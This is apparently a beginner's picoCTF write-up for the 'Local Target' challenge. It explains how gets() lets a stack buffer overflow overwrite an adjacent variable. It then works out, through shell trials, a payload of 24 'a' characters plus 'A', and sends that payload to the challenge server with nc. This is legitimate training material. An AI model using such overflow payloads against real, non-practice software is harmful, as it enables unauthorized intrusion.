# Local Target

Challenge Link: <https://play.picoctf.org/practice/challenge/399?difficulty=2&originalEvent=gym&page=1>

## Writeup

I really don't know much about this kind of vulnerability but I found from [this article](https://heimdalsecurity.com/blog/stack-smashing/) that smash stacking (from the challenge description) is a kind of buffer overflow where you overwrite sections of the stack which is a memory section in a program where function scoped values are stored.

### Source Code Analysis

We are actually given a copy of the source code and the program that we can check before we attack the service.

In the following code we can see that to get the flag we need to set the variable `num` to 65.

```c
if( num == 65 ){
    printf("You win!\n");
    fflush(stdout);
    // Open file
    fptr = fopen("flag.txt", "r");
    if (fptr == NULL)
    {
        printf("Cannot open file.\n");
        fflush(stdout);
        exit(0);
    }
}
```

The section of code that covers **defining num** shows that we have an `input` buffer thats `16 bytes` long, then the we have `num` which is set to 64. Further, `input` is filled using the `gets()` function.

```c
char input[16];
int num = 64;

printf("Enter a string: ");
fflush(stdout);
gets(input);
printf("\n");

printf("num is %d\n", num);
fflush(stdout);
```

In my research I found this [Stack Overflow Thread](https://stackoverflow.com/questions/4346598/gets-function-in-c) which said that gets() is a function that reads all of the input given without checking the length.

This means we can just enter a really long string and this will eventually spill out into `num` eventually.

### Buffer Overflow Testing

Now that we know the vulnerable part of the program we can test it to see if we can set `num` to 65. The program actually outputs `num` after `input` is set so we can easily test the value.

I know 2 things:

1. `num` will change because of my input somehow
2. `Input` is 16 `char` long

So I started by inputting a string of 16 'a' characters which didn't do anything to `num`

```sh
wsl@PC01:/tmp/ctf$ ./local-target
Enter a string: aaaaaaaaaaaaaaaa

num is 64
Bye!
```

Tried 32 a's which did change the value of num and create a seg fault

```sh
wsl@PC01:/tmp/ctf$ ./local-target
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

num is 1633771873
Bye!
Segmentation fault (core dumped)
```

So I tried removing 1 a from the string until I got back to `num=64` which was 22 a's

```sh
wsl@PC01:/tmp/ctf$ ./local-target
Enter a string: aaaaaaaaaaaaaaaaaaaaaa

num is 64
Bye!
```

On the way back to 64 I noticed that one of the strings made `num=0` then the one before was `num=97` which is the letter a in **ascii**.

```sh
wsl@PC01:/tmp/ctf$ ./local-target
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaa

num is 97
Bye!
wsl@PC01:/tmp/ctf$ ./local-target
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaa

num is 0
Bye!
```

Then I went to the [ASCII table](https://www.asciitable.com/) and found out that A is 65 in ascii so I tried the same input that resulted in 97 but changed the last a to A and I got the flag output.

```sh
wsl@PC01:/tmp/ctf$ ./local-target
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaA

num is 65
You win!
Cannot open file.
```

### Exploiting the Service

Now we can move onto the service running the application and try the payload we discovered.

```sh
wsl@PC01:/tmp/ctf$ nc saturn.picoctf.net 63220
Enter a string: aaaaaaaaaaaaaaaaaaaaaaaaA

num is 65
You win!
>> FLAG WAS HERE <<
^C
```

And we get the flag!!!
